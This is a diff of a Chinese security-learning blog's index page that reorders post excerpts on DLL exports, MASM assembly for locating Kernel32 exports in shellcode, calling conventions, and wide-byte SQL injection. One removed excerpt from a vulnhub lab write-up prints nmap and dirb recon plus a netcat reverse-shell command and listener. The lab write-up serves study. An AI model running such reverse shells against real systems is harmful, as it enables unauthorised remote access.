@@ -137,43 +137,43 @@
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/08/20/调用dll和编写dll的几种格式/">
-        <p class="h4 index-header">调用dll和编写dll的几种格式</p>
+      <a href="/2019/08/22/MASH和内联MASH/">
+        <p class="h4 index-header">MASH和内联MASH</p>
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">dll的写法一共两种
-全部写在dllmain函数内extern &quot;C&quot; _declspec(dllexport)DWORD Sum(int nArg1,char*nArgv2)
-{
-    MessageBox(0,&quot;this Sum call&quot;,0,MB_OK);
-    return nArg1;
-}
-extern &quot;C&quot; 表示使用C的编译方式编译，C++格式
-_declspec(dllexport)将一个函数申明为导出函数
-就申明了一个导出函数
-但是这中创建的dll的导出函数序号是连续的，我们不可控的。也就是Base是1，然后符号表从1 开始。
-2项目新建 添加一个def文件def中的代码
-LIBRARY    &quot;def导出函数Demo&quot;
-EXPORTS
+          <div class="index-text mb-1">开始前一定先了解下汇编的种类https://blog.csdn.net/ye1223/article/details/79060434
+我这里只简述我学习的MASH汇编和内联的MASH格式的汇编
+mash 汇编如下下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到
+.386
+.model flat,stdcall
+option casemap:none
 
-test1 @1
-test2 @5
-test3 @8
-dllmain中的代码
-// dllmain.cpp : 定义 DLL 应用程序的入口点。
-#include &quot;stdafx.h&quot;
+; 包含printf函数所在的头文件和库文件
+include msvcrt.inc ; 微软vc运行时库的头文件,
+           ; 一般包含的时c语言的各个头文件
+includelib msvcrt.lib ; 包含头文件所对应的库文件
 
-void test3()
-{
-    M</div>
+assume fs:nothing
+
+.const ; 全局常量
+g_formtStr db &quot;%-40s      &quot;,0
+g_formtInt db &quot;%d &quot;,0ah,0
+g_formtHex db &quot;%08X &quot;,0ah,0
+
+.code
+
+
+GetA proc
+    LOCAL @</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-20&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-22&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -184,7 +184,11 @@ void test3()
         
           <i class="iconfont icon-tag"></i>
           
-            <a href="/tags/dll">dll</a>&nbsp;
+            <a href="/tags/shellcode">shellcode</a>&nbsp;
+          
+            <a href="/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96">内联汇编</a>&nbsp;
+          
+            <a href="/tags/mash">mash</a>&nbsp;
           
         
       </div>
@@ -243,6 +247,64 @@ Optional header ：是必要的头介绍一下重要的属性AddressOfEntryPoint
   <div class="row mb-4 mx-auto">
     
     
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/08/20/调用dll和编写dll的几种格式/">
+        <p class="h4 index-header">调用dll和编写dll的几种格式</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">dll的写法一共两种
+全部写在dllmain函数内extern &quot;C&quot; _declspec(dllexport)DWORD Sum(int nArg1,char*nArgv2)
+{
+    MessageBox(0,&quot;this Sum call&quot;,0,MB_OK);
+    return nArg1;
+}
+extern &quot;C&quot; 表示使用C的编译方式编译，C++格式
+_declspec(dllexport)将一个函数申明为导出函数
+就申明了一个导出函数
+但是这中创建的dll的导出函数序号是连续的，我们不可控的。也就是Base是1，然后符号表从1 开始。
+2项目新建 添加一个def文件def中的代码
+LIBRARY    &quot;def导出函数Demo&quot;
+EXPORTS
+
+test1 @1
+test2 @5
+test3 @8
+dllmain中的代码
+// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include &quot;stdafx.h&quot;
+
+void test3()
+{
+    M</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-20&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E7%BC%96%E7%A8%8B">编程</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/dll">dll</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
       <div class="col-12 col-md-4 m-auto">
         <a href="/2019/08/18/IDA制作签名/" target="_self">
           <img src="https://w.wallhaven.cc/full/96/wallhaven-96z68x.jpg" srcset="/img/loading.gif" alt="IDA制作签名" class="img-fluid rounded z-depth-3 index-thumbnails">
@@ -283,6 +345,46 @@ Optional header ：是必要的头介绍一下重要的属性AddressOfEntryPoint
           <i class="iconfont icon-tag"></i>
           
             <a href="/tags/IDA">IDA</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/08/10/call的几种传参方式/">
+        <p class="h4 index-header">call的几种传参方式</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">stdcall 参数使用栈，平衡是在函数内，通过函数内的最后一个retn X来平衡，这个X用来指定pop几个字来平衡堆栈 
+cdecl 栈传参，函数外平衡堆栈
+fastcall 是通过寄存器，因为是寄存器fast嘛
+下面这种call是用在有类对象引用的时候来表示传参的thiscall 是用ecx来穿this指针的，一般都是 类似lea ecx [ebp+var_20]进入函数函数后  ecx就能会直接拿来用，不会再次赋值。
+识别参数个数1.点亮call后依次进去看调用的方式，非stdcall则再看参数的中占用大小2.划分push 的归属3.遇到栈平衡相关指令。点亮push核对下已分配是否有误4.注意识别出某些push为下一个函数所用5.另外还要看某push归属于某个函数的最后参数却不使用的参数不确定的可以call进函数里，看看最后函数返回的时候堆栈平衡的参数大小，来确定传入参数
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F">传参方式</a>&nbsp;
           
         
       </div>
@@ -347,46 +449,6 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/08/10/call的几种传参方式/">
-        <p class="h4 index-header">call的几种传参方式</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">stdcall 参数使用栈，平衡是在函数内，通过函数内的最后一个retn X来平衡，这个X用来指定pop几个字来平衡堆栈 
-cdecl 栈传参，函数外平衡堆栈
-fastcall 是通过寄存器，因为是寄存器fast嘛
-下面这种call是用在有类对象引用的时候来表示传参的thiscall 是用ecx来穿this指针的，一般都是 类似lea ecx [ebp+var_20]进入函数函数后  ecx就能会直接拿来用，不会再次赋值。
-识别参数个数1.点亮call后依次进去看调用的方式，非stdcall则再看参数的中占用大小2.划分push 的归属3.遇到栈平衡相关指令。点亮push核对下已分配是否有误4.注意识别出某些push为下一个函数所用5.另外还要看某push归属于某个函数的最后参数却不使用的参数不确定的可以call进函数里，看看最后函数返回的时候堆栈平衡的参数大小，来确定传入参数
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-10&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F">传参方式</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
       <a href="/2019/06/15/dc-2/">
         <p class="h4 index-header">vulnhub 靶机系列 dc-2</p>
         
@@ -420,44 +482,6 @@ fastcall 是通过寄存器，因为是寄存器fast嘛
             <a href="/tags/web%E6%B8%97%E9%80%8F">web渗透</a>&nbsp;
           
             <a href="/tags/%E9%9D%B6%E6%9C%BA">靶机</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/06/11/WEB温习第二天/">
-        <p class="h4 index-header">web渗透基础二</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">
-宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，第一个字节ascii码大于128，基本上就可以了），此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。
-
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-11&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a>&nbsp;
           
         
       </div>
@@ -527,6 +551,44 @@ if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/06/11/WEB温习第二天/">
+        <p class="h4 index-header">web渗透基础二</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">
+宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，第一个字节ascii码大于128，基本上就可以了），此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用。
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-11&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">宽字节注入</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2019/06/10/WEB温习第一天/">
         <p class="h4 index-header">web渗透基础一</p>
         
@@ -569,62 +631,6 @@ if( isset( $_GET[ &#39;Login&#39; ] ) ) {
             <a href="/tags/DVWA">DVWA</a>&nbsp;
           
             <a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/06/03/silky：0x02靶机总结/">
-        <p class="h4 index-header">silky：0x02靶机总结</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">靶机靶机来源vulnhub
-下载 ova文件，VM 或 VB 都是可以直接打开的
-渗透具体可以详细可以参阅 YouTube
-我这里来记录下我的过程
-扫主机nmap 10.0.0.0/24我的是这个网段
-或者直接使用netdiscover进行主机发现，比不过比较慢
-我这里的靶机IP是10.0.0.141
-扫服务 nmap -A 10.0.0.141 扫出具体的端口及其服务。
-发现 22 端口和 80 直接访问80 
-打开看是一个登陆页面，随意点点看，有个登陆页
-后台路径遍历dirb http://10.0.0.141 /var/share/wordlists/dirb/common.txt
-没有扫出什么有用的，搞登陆页
-登陆页弱口令试试，没发现什么。hydra 爆破 http有待学习，
-根据视频提示username 参数有代码执行
-代码执行这里直接上一个nc的反弹shell
-nc 10.0.0.141 8848 -t -e /bin/bash
-攻击机这边监听
-nc -lnvp 8848
-界面不好看，上一个python的pty
-python -c &quot;import pty;pty.</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-06-03&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/linux">linux</a>&nbsp;
-          
-            <a href="/tags/web%E6%B8%97%E9%80%8F">web渗透</a>&nbsp;
           
         
       </div>
